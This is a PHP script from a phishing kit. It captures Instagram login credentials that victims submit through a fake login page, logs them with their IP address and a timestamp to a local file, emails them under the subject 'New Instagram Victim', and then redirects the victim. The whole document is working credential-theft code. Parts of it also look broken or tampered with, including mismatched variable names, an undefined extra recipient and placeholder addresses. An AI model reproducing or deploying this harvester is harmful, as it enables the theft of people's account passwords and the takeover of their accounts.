<?php
# By Manisso & IcoDz    
                                                                                                                   
$date = gmdate ("d-n-Y");
$time = gmdate ("H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$message .= "========== Instagram Login ==========";
$message .= "User: ".$_POST['email']."";
$message .= "Pass: ".$_POST['password']."";
$message .= "----------";
$message .= "IP: ".$ip."";
$message .= "Log : $time / $date";
$rnessage = "$message";
$send= "google.vide";
$subject = "New Instagram Victim | $ip";
$headers = "From: Instagram";
$file = fopen("logs.txt","ab");
fwrite($file,$message);
fclose($file);
$str=array($send, $IWP); foreach ($str as $send)
if(mail($send,$subject,$rnessage,$headers) != false)
{
mail($Send,$subject,$rnessage,$headers);
}
header("Location: google");
?>
